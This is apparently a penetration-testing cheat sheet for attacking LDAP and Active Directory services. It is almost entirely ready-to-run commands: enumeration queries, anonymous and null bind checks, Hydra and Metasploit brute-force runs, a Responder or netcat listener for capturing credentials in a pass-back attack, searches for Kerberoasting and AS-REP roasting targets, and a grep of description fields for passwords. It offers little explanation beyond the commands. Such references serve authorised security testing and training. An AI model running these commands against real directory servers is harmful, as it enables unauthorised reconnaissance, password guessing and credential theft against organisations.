# Port 389, 636, 3268, 3269 - LDAP

## Table of Contents

- [Enumeration](#enumeration)
  - [ldapsearch](#ldapsearch)
  - [ldapwhoami](#ldapwhoami)
  - [Nmap Scripts](#nmap-scripts)
  - [User Enumeration](#user-enumeration)
  - [Group Enumeration](#group-enumeration)
  - [Computer Enumeration](#computer-enumeration)
- [Attack Vectors](#attack-vectors)
- [Post-Exploitation](#post-exploitation)

---

## Enumeration

### ldapsearch

```shell
# Anonymous bind
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com"

# With credentials
ldapsearch -x -H ldap://$rhost -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"

# LDAPS (SSL/TLS)
ldapsearch -x -H ldaps://$rhost:636 -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"

# Get root DSE
ldapsearch -x -H ldap://$rhost -b "" -s base "(objectclass=*)"

# Get naming contexts
ldapsearch -x -H ldap://$rhost -b "" -s base "(objectclass=*)" namingContexts
```

### ldapwhoami

```shell
# Test authentication
ldapwhoami -x -H ldap://$rhost -D "cn=admin,dc=example,dc=com" -w password

# Anonymous bind test
ldapwhoami -x -H ldap://$rhost
```

### Nmap Scripts

```shell
# Service detection
nmap -p 389,636,3268 $rhost

# Root DSE
nmap -p 389 -sV --script ldap-rootdse $rhost

# Brute force
nmap -p 389 --script ldap-brute --script-args ldap.base='"dc=example,dc=com"' $rhost
```

### User Enumeration

```shell
# List all users
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName

# Users with specific attributes
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=user)" cn mail

# Users with passwords never expire
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=65536)"

# Service accounts (with SPNs)
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" servicePrincipalName
```

### Group Enumeration

```shell
# List all groups
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=group)" cn

# Domain Admins
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(cn=Domain Admins)" member

# All admin groups
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(&(objectClass=group)(cn=*admin*))" cn member
```

### Computer Enumeration

```shell
# List computers
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=computer)" cn

# Domain controllers
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" dNSHostName
```

---

## Attack Vectors

### Anonymous Bind

```shell
# Test anonymous access
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=*)"

# If successful, enumerate
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=user)"
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=group)"
```

### Null Bind

```shell
# Bind with empty credentials
ldapsearch -x -H ldap://$rhost -D "" -w "" -b "dc=example,dc=com"
```

### Brute Force

```shell
# Using Hydra
hydra -L users.txt -P passwords.txt $rhost ldap2 -s 389

# Using Metasploit
use auxiliary/scanner/ldap/ldap_login
set RHOSTS $rhost
set USERNAME admin
set PASS_FILE passwords.txt
run
```

### Pass-Back Attack

```shell
# Setup rogue LDAP server to capture credentials
sudo responder -I eth0
# or
sudo nc -lvnp 389
```

---

## Post-Exploitation

> **ðŸ“– For complete Kerberos attack methodology, see [Kerberos Attacks](../../3.AD-Exploit/3.3.Kerberos-Attacks.md)**

### Kerberoasting Targets

```shell
# Find SPNs (Service Principal Names)
ldapsearch -x -H ldap://$rhost -D "cn=admin,dc=example,dc=com" -w password \
  -b "dc=example,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

### ASREPRoasting Targets

```shell
# Find users with "Do not require Kerberos preauthentication"
ldapsearch -x -H ldap://$rhost -D "cn=admin,dc=example,dc=com" -w password \
  -b "dc=example,dc=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

### Password Hunting

```shell
# Look for passwords in description field
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(description=*)" description | grep -i "pass\|pwd\|secret"
```

### Useful Tools

| Tool | Description |
| ------ | ------------- |
| ldapsearch | LDAP query tool |
| ldapdomaindump | AD info dumper |
| windapsearch | AD enumeration |
| enum4linux-ng | SMB/LDAP enumerator |
| Apache Directory Studio | LDAP GUI |

---

## Common LDAP Filters

```shell
# All users
(objectClass=user)

# All groups
(objectClass=group)

# All computers
(objectClass=computer)

# Domain Admins
(cn=Domain Admins)

# Users with SPNs
(&(objectClass=user)(servicePrincipalName=*))

# Disabled accounts
(userAccountControl:1.2.840.113556.1.4.803:=2)
```
